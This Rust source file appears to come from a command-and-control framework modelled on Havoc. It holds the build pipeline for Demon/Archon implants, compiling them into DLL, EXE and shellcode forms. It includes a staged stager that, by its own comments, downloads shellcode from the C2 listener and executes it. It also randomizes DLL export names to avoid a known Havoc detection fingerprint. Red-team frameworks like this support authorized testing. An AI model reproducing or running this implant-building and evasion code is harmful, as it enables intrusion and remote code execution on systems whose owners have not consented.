//! Demon/Archon C/ASM build pipeline.
//!
//! Extracted from `payload_builder/mod.rs` to isolate the MinGW + NASM
//! cross-compilation flow (Demon DLL/EXE/Shellcode/RawShellcode/StagedShellcode)
//! from the Rust agent (Phantom/Specter) pipeline and module bootstrap code.

use std::ffi::OsString;
use std::path::{Path, PathBuf};

use serde_json::{Map, Value};
use tempfile::TempDir;

use red_cell_common::ListenerConfig;

use super::build_defs::{
    archon_ecdh_defines, build_defines, build_stager_defines, default_compiler_flags,
    generate_archon_export_name, generate_archon_magic, main_args, stager_cache_bytes,
};
use super::cache::compute_cache_key;
use super::compiler::{asm_sources, c_sources, run_command};
use super::demon_config::pack_config;
use super::formats::{Architecture, OutputFormat};
use super::pe_patch::patch_payload;
use super::{
    AgentBuildContext, BuildProgress, PayloadArtifact, PayloadBuildError, PayloadBuilderService,
};

impl PayloadBuilderService {
    #[allow(clippy::too_many_arguments)]
    pub(super) async fn build_impl<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format: OutputFormat,
        config: &Map<String, Value>,
        agent: &AgentBuildContext<'_>,
        compile_dir: &Path,
        ecdh_pub_key: Option<[u8; 32]>,
        progress: &mut F,
    ) -> Result<(Vec<u8>, Option<String>), PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        if format == OutputFormat::Shellcode {
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "compiling core dll".to_owned(),
            });
            let (dll_bytes, _) = self
                .compile_portable_executable(
                    listener,
                    architecture,
                    OutputFormat::Dll,
                    config,
                    agent,
                    compile_dir,
                    true,
                    ecdh_pub_key,
                    progress,
                )
                .await?;
            let template = tokio::fs::read(match architecture {
                Architecture::X64 => &self.inner.shellcode_x64_template,
                Architecture::X86 => &self.inner.shellcode_x86_template,
            })
            .await?;

            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("compiled core dll [{} bytes]", dll_bytes.len()),
            });

            let mut shellcode = template;
            shellcode.extend_from_slice(&dll_bytes);
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("shellcode payload [{} bytes]", shellcode.len()),
            });
            progress(BuildProgress {
                level: "Good".to_owned(),
                message: "payload generated".to_owned(),
            });
            // Shellcode is loaded via DllMain, not the named export — export name not needed.
            return Ok((shellcode, None));
        }

        if format == OutputFormat::RawShellcode {
            if architecture == Architecture::X86 {
                return Err(PayloadBuildError::InvalidRequest {
                    message:
                        "Windows Raw Shellcode requires x64 architecture: no x86 DllLdr binary \
                         is available"
                            .to_owned(),
                });
            }
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "compiling core dll for raw shellcode".to_owned(),
            });
            let (dll_bytes, _) = self
                .compile_portable_executable(
                    listener,
                    architecture,
                    OutputFormat::Dll,
                    config,
                    agent,
                    compile_dir,
                    true,
                    ecdh_pub_key,
                    progress,
                )
                .await?;
            let template = tokio::fs::read(&self.inner.dllldr_x64_template).await?;

            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("compiled core dll [{} bytes]", dll_bytes.len()),
            });

            let mut shellcode = template;
            shellcode.extend_from_slice(&dll_bytes);
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("raw shellcode payload [{} bytes]", shellcode.len()),
            });
            progress(BuildProgress {
                level: "Good".to_owned(),
                message: "payload generated".to_owned(),
            });
            // DllLdr loads via DllMain — export name not needed by callers.
            return Ok((shellcode, None));
        }

        let (bytes, export_name) = self
            .compile_portable_executable(
                listener,
                architecture,
                format,
                config,
                agent,
                compile_dir,
                false,
                ecdh_pub_key,
                progress,
            )
            .await?;
        progress(BuildProgress {
            level: "Good".to_owned(),
            message: "payload generated".to_owned(),
        });
        Ok((bytes, export_name))
    }

    #[allow(clippy::too_many_arguments)]
    async fn compile_portable_executable<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format: OutputFormat,
        config: &Map<String, Value>,
        agent: &AgentBuildContext<'_>,
        compile_dir: &Path,
        shellcode_define: bool,
        ecdh_pub_key: Option<[u8; 32]>,
        progress: &mut F,
    ) -> Result<(Vec<u8>, Option<String>), PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let config_bytes = pack_config(listener, config, agent.name)?;
        progress(BuildProgress {
            level: "Info".to_owned(),
            message: format!("config size [{} bytes]", config_bytes.len()),
        });

        let output_path = compile_dir.join(format!(
            "{}{}{}",
            agent.name,
            architecture.suffix(),
            format.file_extension()
        ));
        let mut defines = build_defines(listener, config_bytes.as_slice(), shellcode_define)?;
        let mut extra_link_flags: Vec<&'static str> = Vec::new();
        let mut export_name: Option<String> = None;
        if agent.name == "archon" {
            let (magic_define, _magic_value) = generate_archon_magic()?;
            defines.push(magic_define);
            // Randomize the DLL export name for every Archon DLL/ReflectiveDll build so
            // that no two binaries share the known "Start" Havoc fingerprint.
            if matches!(format, OutputFormat::Dll | OutputFormat::ReflectiveDll) {
                let (export_define, name) = generate_archon_export_name()?;
                defines.push(export_define);
                export_name = Some(name);
            }
            if let Some(pub_key) = ecdh_pub_key {
                defines.extend(archon_ecdh_defines(&pub_key)?);
                // ARCHON_ECDH_MODE pulls in BCryptGenRandom for the CSPRNG adapter
                // (src/Demon.c::ArchonEcdhRng). bcrypt.dll is not part of the default
                // MinGW link set under -nostdlib, so without this the link step fails
                // with "undefined reference to `BCryptGenRandom`".
                extra_link_flags.push("-lbcrypt");
            }
        }
        let object_files = self
            .compile_asm_objects(architecture, agent.source_root, compile_dir, progress)
            .await?;
        let compiler = match architecture {
            Architecture::X64 => &self.inner.toolchain.compiler_x64,
            Architecture::X86 => &self.inner.toolchain.compiler_x86,
        };

        let mut args: Vec<OsString> = Vec::new();
        args.extend(object_files.into_iter().map(|path| path.into_os_string()));
        for path in c_sources(agent.source_root)? {
            args.push(
                path.strip_prefix(agent.source_root)
                    .map_err(|source| PayloadBuildError::ToolchainUnavailable {
                        message: format!(
                            "failed to relativize source path {}: {source}",
                            path.display()
                        ),
                    })?
                    .as_os_str()
                    .to_os_string(),
            );
        }
        args.push(OsString::from("src/Demon.c"));
        args.push(OsString::from("-Iinclude"));
        args.extend(default_compiler_flags(format).into_iter().map(OsString::from));
        args.extend(defines.into_iter().map(|define| OsString::from(format!("-D{define}"))));
        args.extend(main_args(architecture, format).into_iter().map(OsString::from));
        // Extra link flags (e.g. -lbcrypt for Archon ECDH) must appear after the
        // source/object arguments so the linker can resolve symbols referenced
        // from those inputs.
        args.extend(extra_link_flags.into_iter().map(OsString::from));
        args.push(OsString::from("-o"));
        args.push(output_path.as_os_str().to_os_string());

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "compiling source".to_owned(),
        });
        run_command(compiler, &args, agent.source_root, progress).await?;
        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "finished compiling source".to_owned(),
        });

        let mut payload = tokio::fs::read(&output_path).await?;
        if let Some(binary_patch) = &self.inner.binary_patch {
            payload = patch_payload(payload, architecture, binary_patch)?;
        }
        Ok((payload, export_name))
    }

    async fn compile_asm_objects<F>(
        &self,
        architecture: Architecture,
        source_root: &Path,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<PathBuf>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let mut objects = Vec::new();

        for source in asm_sources(source_root, architecture)? {
            let file_stem =
                source.file_stem().and_then(|value| value.to_str()).ok_or_else(|| {
                    PayloadBuildError::ToolchainUnavailable {
                        message: format!("invalid assembly source file name {}", source.display()),
                    }
                })?;
            let object_path = compile_dir.join(format!("{file_stem}.o"));
            let relative = source.strip_prefix(source_root).map_err(|error| {
                PayloadBuildError::ToolchainUnavailable {
                    message: format!(
                        "failed to relativize assembly source {}: {error}",
                        source.display()
                    ),
                }
            })?;

            run_command(
                &self.inner.toolchain.nasm,
                &[
                    OsString::from("-f"),
                    OsString::from(architecture.nasm_format()),
                    relative.as_os_str().to_os_string(),
                    OsString::from("-o"),
                    object_path.as_os_str().to_os_string(),
                ],
                source_root,
                progress,
            )
            .await?;
            objects.push(object_path);
        }

        Ok(objects)
    }

    /// Build path for the staged shellcode format.
    ///
    /// The stager does not embed a Demon config — it only needs the C2
    /// connection parameters.  The cache key is derived from the listener
    /// connection info so that re-builds with the same listener are cached.
    pub(super) async fn build_staged_payload<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format_str: &str,
        progress: &mut F,
    ) -> Result<PayloadArtifact, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let stager_key_bytes = stager_cache_bytes(listener)?;
        // Staged shellcode stagers are always built from the Demon source tree.
        let cache_key = compute_cache_key(
            "demon",
            architecture,
            OutputFormat::StagedShellcode,
            &stager_key_bytes,
            None,
        )?;

        if let Some(cached) = self.inner.cache.get(&cache_key).await {
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "cache hit — returning cached artifact".to_owned(),
            });
            let file_name = format!(
                "demon{}{}",
                architecture.suffix(),
                OutputFormat::StagedShellcode.file_extension()
            );
            return Ok(PayloadArtifact {
                bytes: cached,
                file_name,
                format: format_str.to_owned(),
                export_name: None,
            });
        }

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "starting stager build".to_owned(),
        });

        let temp_dir = TempDir::new()?;
        let compiled =
            self.compile_stager(listener, architecture, temp_dir.path(), progress).await?;
        let file_name = format!(
            "demon{}{}",
            architecture.suffix(),
            OutputFormat::StagedShellcode.file_extension()
        );

        self.inner.cache.put(&cache_key, &compiled).await;

        Ok(PayloadArtifact {
            bytes: compiled,
            file_name,
            format: format_str.to_owned(),
            export_name: None,
        })
    }

    /// Compile the staged shellcode stager from `payloads/templates/MainStager.c`.
    ///
    /// The stager is a standalone Windows EXE that downloads the Demon
    /// shellcode payload from the C2 listener at run time and executes it.
    /// It is compiled without the Demon source tree.
    async fn compile_stager<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<u8>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let template_dst = compile_dir.join("MainStager.c");
        tokio::fs::copy(&self.inner.stager_template, &template_dst).await?;

        let defines = build_stager_defines(listener)?;

        let output_path = compile_dir.join(format!(
            "stager{}{}",
            architecture.suffix(),
            OutputFormat::StagedShellcode.file_extension()
        ));

        let compiler = match architecture {
            Architecture::X64 => &self.inner.toolchain.compiler_x64,
            Architecture::X86 => &self.inner.toolchain.compiler_x86,
        };

        let entry = if architecture == Architecture::X64 { "WinMain" } else { "_WinMain" };

        let mut args: Vec<OsString> = vec![
            OsString::from("MainStager.c"),
            OsString::from("-Os"),
            OsString::from("-s"),
            OsString::from("-mwindows"),
            OsString::from("-lwininet"),
            OsString::from("-Wl,--gc-sections"),
        ];
        args.extend(defines.into_iter().map(|d| OsString::from(format!("-D{d}"))));
        args.push(OsString::from("-e"));
        args.push(OsString::from(entry));
        args.push(OsString::from("-o"));
        args.push(output_path.as_os_str().to_os_string());

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "compiling stager".to_owned(),
        });
        run_command(compiler, &args, compile_dir, progress).await?;
        progress(BuildProgress {
            level: "Good".to_owned(),
            message: "payload generated".to_owned(),
        });

        Ok(tokio::fs::read(&output_path).await?)
    }
}
